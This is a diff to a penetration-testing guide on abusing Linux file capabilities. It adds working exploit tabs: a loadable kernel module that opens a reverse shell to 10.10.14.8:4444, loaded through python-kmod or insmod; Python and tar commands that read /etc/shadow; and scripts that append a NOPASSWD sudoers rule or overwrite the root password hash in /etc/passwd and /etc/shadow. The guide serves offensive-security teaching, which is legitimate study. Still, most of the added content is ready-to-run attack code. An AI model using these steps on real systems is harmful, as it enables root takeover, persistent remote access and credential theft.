@@ -59,10 +59,6 @@ capsh --decode=0000003fffffffff
 
 ### Binaries Capabilities
 
-{% hint style="danger" %}
-Having the capability =ep means the binary has all the capabilities
-{% endhint %}
-
 {% tabs %}
 {% tab title="Enumerate" %}
 Binaries can have capabilities that can be used while executing. We can search binaries with capabilities as follow
@@ -76,6 +72,10 @@ getcap -r / 2>/dev/null
 If you find that a binary have interesting capabilities, you can check on [GTFOBins](https://gtfobins.github.io/) for known exploits.
 {% endtab %}
 {% endtabs %}
+
+{% hint style="danger" %}
+Having the capability =ep means the binary has all the capabilities
+{% endhint %}
 
 ### Setcap with SUID/SUDO
 
@@ -114,10 +114,12 @@ setcap cap_setuid+ep /home/<user>/python3
 
 {% tabs %}
 {% tab title="Desc" %}
-[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is largely a catchall capability, it can easily lead to additional capabilities or full root (typically access to all capabilities). `CAP_SYS_ADMIN` is required to perform a range of **administrative operations**, which is difficult to drop from containers if privileged operations are performed within the container. Retaining this capability is often necessary for containers which mimic entire systems versus individual application containers which can be more restrictive. Among other things this allows to **mount devices** or abuse **release\_agent** to escape from the container.
+[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is largely a catchall capability, it can easily lead to additional capabilities or full root (typically access to all capabilities). `CAP_SYS_ADMIN` is required to perform a range of **administrative operations**, which is difficult to drop from containers if privileged operations are performed within the container.
+
+Retaining this capability is often necessary for containers which mimic entire systems versus individual application containers which can be more restrictive. Among other things this allows to **mount devices** or abuse **release\_agent** to escape from the container.
 {% endtab %}
 
-{% tab title="Exploit" %}
+{% tab title="Exploit - Python" %}
 For example, if python have the `CAP_SYS_ADMIN` capabilities,  we can mount a modified _passwd_ file on top of the real _passwd_ file.
 
 ```bash
@@ -158,7 +160,9 @@ If you are in a docker container and `CAP_SYS_ADMIN` is enabled, then you can es
 
 {% tabs %}
 {% tab title="Desc" %}
-[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use `ptrace(2)` and recently introduced cross memory attach system calls such as `process_vm_readv(2)` and `process_vm_writev(2)`. If this capability is granted and the `ptrace(2)` system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53).
+[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use `ptrace(2)` and recently introduced cross memory attach system calls such as `process_vm_readv(2)` and `process_vm_writev(2)`.&#x20;
+
+If this capability is granted and the `ptrace(2)` system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53).
 {% endtab %}
 
 {% tab title="Exploit - Python" %}
@@ -338,11 +342,170 @@ process 207009 is executing new program: /usr/bin/dash
 
 {% tabs %}
 {% tab title="Desc" %}
+[**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the process to load and unload arbitrary kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls).&#x20;
 
+This could lead to trivial privilege escalation and ring-0 compromise. The kernel can be modified at will, subverting all system security, Linux Security Modules, and container systems.&#x20;
+
+**This means that you can** **insert/remove kernel modules in/from the kernel of the host machine.**
 {% endtab %}
 
-{% tab title="Exploit" %}
+{% tab title="Exploit - Python" %}
+In the following example the binary **`python`** has this capability.
 
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/python2.7 = cap_sys_module+ep
+```
+
+In order to abuse this, lets create a fake **lib/modules** folder
+
+```bash
+mkdir lib/modules -p
+cp -a /lib/modules/$(uname -r)/ lib/modules/$(uname -r)
+```
+
+**Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it
+
+{% code title="reverse-shell.c" %}
+```c
+#include <linux/kmod.h>
+#include <linux/module.h>
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+
+// call_usermodehelper function is used to create user mode processes from kernel space
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO "Exiting\n");
+}
+
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+```
+{% endcode %}
+
+{% code title="Makefile" %}
+```c
+obj-m +=reverse-shell.o
+
+all:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+```
+{% endcode %}
+
+{% hint style="danger" %}
+The blank char before each make word in the Makefile **must be a tab, not spaces**!
+{% endhint %}
+
+We can compile it using our `Makefile` and the `make` command
+
+```bash
+make
+```
+
+{% hint style="danger" %}
+If you can't find the /lib/modules/\<version>/build folder, this is because you have not download the linux headers of your kernel version
+{% endhint %}
+
+Finally, we can execute this python code&#x20;
+
+```bash
+#On target machine
+$ cat exploit.py
+import kmod
+km = kmod.Kmod()
+km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
+km.modprobe("reverse-shell")
+
+$ python exloit.py
+
+#On attacking machine 
+nc -lvnp 4444
+```
+{% endtab %}
+
+{% tab title="Exploit -  kmod" %}
+In the following example the binary **`kmod`** has this capability.
+
+```bash
+getcap -r / 2>/dev/null
+/bin/kmod = cap_sys_module+ep
+```
+
+It means that it's possible to use the command **`insmod`** to insert a kernel module. We can use the same `C` code seen in the previous example to get a **reverse shell** abusing this privilege.
+
+{% code title="reverse-shell.c" %}
+```c
+#include <linux/kmod.h>
+#include <linux/module.h>
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+
+// call_usermodehelper function is used to create user mode processes from kernel space
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO "Exiting\n");
+}
+
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+```
+{% endcode %}
+
+{% code title="Makefile" %}
+```bash
+obj-m +=reverse-shell.o
+
+all:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+```
+{% endcode %}
+
+{% hint style="danger" %}
+The blank char before each make word in the Makefile **must be a tab, not spaces**!
+{% endhint %}
+
+We can compile it using our `Makefile` and the `make` command
+
+```bash
+make
+```
+
+{% hint style="danger" %}
+If you can't find the /lib/modules/\<version>/build folder, this is because you have not download the linux headers of your kernel version
+{% endhint %}
+
+Finally, load the module using `insmode`
+
+```bash
+#On target machine
+insmod reverse-shell.ko #Launch the reverse shell
+
+#On attacking machine
+nc -lvnp 4444
+```
 {% endtab %}
 {% endtabs %}
 
@@ -350,11 +513,54 @@ process 207009 is executing new program: /usr/bin/dash
 
 {% tabs %}
 {% tab title="Desc" %}
+[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to **bypass file read, and directory read and execute permissions**. While this was designed to be used for searching or reading files, it also grants the process permission to invoke `open_by_handle_at(2)`.&#x20;
 
+Any process with the capability `CAP_DAC_READ_SEARCH` can use `open_by_handle_at(2)` to gain access to any file, even files outside their mount namespace. The handle passed into `open_by_handle_at(2)` is intended to be an opaque identifier retrieved using `name_to_handle_at(2)`. However, this handle contains sensitive and tamperable information, such as inode numbers. This was first shown to be an issue in Docker containers by Sebastian Krahmer with [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) exploit.
+
+**This means that you can** **bypass can bypass file read permission checks and directory read/execute permission checks.**
 {% endtab %}
 
-{% tab title="Exploit" %}
+{% tab title="Exploit - Python" %}
+In the following example the binary **`python`** has this capability.&#x20;
 
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/python3.11 = cap_dac_read_search+ep
+```
+
+We can abuse it to read the `/etc/shadow` file
+
+```bash
+$ cat exploit.py
+print(open("/etc/shadow", "r").read())
+
+$ python3.11 exploit.py
+```
+{% endtab %}
+
+{% tab title="Exploit - Tar" %}
+In the following example the binary **`tar`** has this capability.&#x20;
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/tar = cap_dac_read_search+ep
+```
+
+We can abuse it to read the `/etc/shadow` file
+
+```bash
+LFILE=/etc/shadow
+tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
+```
+
+Alternatively, we can do as follow
+
+```bash
+cd /etc
+tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
+cd /tmp
+tar -cxf shadow.tar.gz
+```
 {% endtab %}
 {% endtabs %}
 
@@ -362,11 +568,122 @@ process 207009 is executing new program: /usr/bin/dash
 
 {% tabs %}
 {% tab title="Desc" %}
+[**CAP\_DAC\_OVERRIDE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to ignore the permission bits of files. With this capability, you can modify any file like `passwd`, `sudoers` or `shadow` to obtain root access.
 
+**This mean that you can bypass write permission checks on any file, so you can write any file.**
 {% endtab %}
 
-{% tab title="Exploit" %}
+{% tab title="Exploit - Python" %}
+In the following example the binary **`python`** has this capability.&#x20;
 
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/python3.11 = cap_dac_override+ep
+```
+
+We can abuse it to override the `/etc/sudoer` file
+
+```bash
+$ cat exploit.py
+file=open("/etc/sudoers","a")
+file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
+file.close()
+
+$ python3 exploit.py
+```
+
+We can now spawn an elevated shell
+
+```bash
+$ sudo /bin/bash
+#or
+$ sudo su
+```
+
+
+
+**Alternatively**, we can overwritte the `/etc/passwd` file. First we have to generate a new password hash
+
+```bash
+#Using mkpasswd
+$ mkpasswd  -m sha-512 -S saltsalt -s
+Mot de passe : password1
+$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/
+
+#Or with openssl
+$ openssl passwd -6 password1
+$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
+```
+
+Then, use the following script to edit the `/etc/passwd` file
+
+```bash
+$ cat exploit.py
+
+import sys
+
+password = sys.argv[1]
+
+contents = []
+with open("/etc/passwd") as file:
+    for line in file:
+        if line.startswith("root"):
+            contents.append(line.replace(":x:", ":%s:" % password))
+        else:
+            contents.append(line)
+    pass
+
+with open("/etc/passwd", "w") as file:
+    file.writelines(contents)
+
+print("done")
+
+$ python3.11 exploit.py '$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/'
+$ head -n1 /etc/passwd
+root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:0:0:root:/root:/usr/bin/zsh
+```
+
+We can now easly `su` as root
+
+```bash
+su - root
+```
+{% endtab %}
+
+{% tab title="Exploit Vim" %}
+In the following example the binary **`vim`** has this capability.&#x20;
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/vim = cap_dac_override+ep
+```
+
+We can abuse it to override the `/etc/shadow` file. First we can generate a new password hash
+
+```bash
+#Using mkpasswd
+$ mkpasswd  -m sha-512 -S saltsalt -s
+Mot de passe : password1
+$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/
+
+#Or with openssl
+$ openssl passwd -6 password1
+$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
+```
+
+Now we can just vim the /etc/passwd file and replace the root hash by the generated one
+
+```bash
+$ vim /etc/shadow
+$ head -n1 /etc/shadow
+root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
+```
+
+We can now easly `su` as root
+
+```bash
+su - root
+```
 {% endtab %}
 {% endtabs %}
 
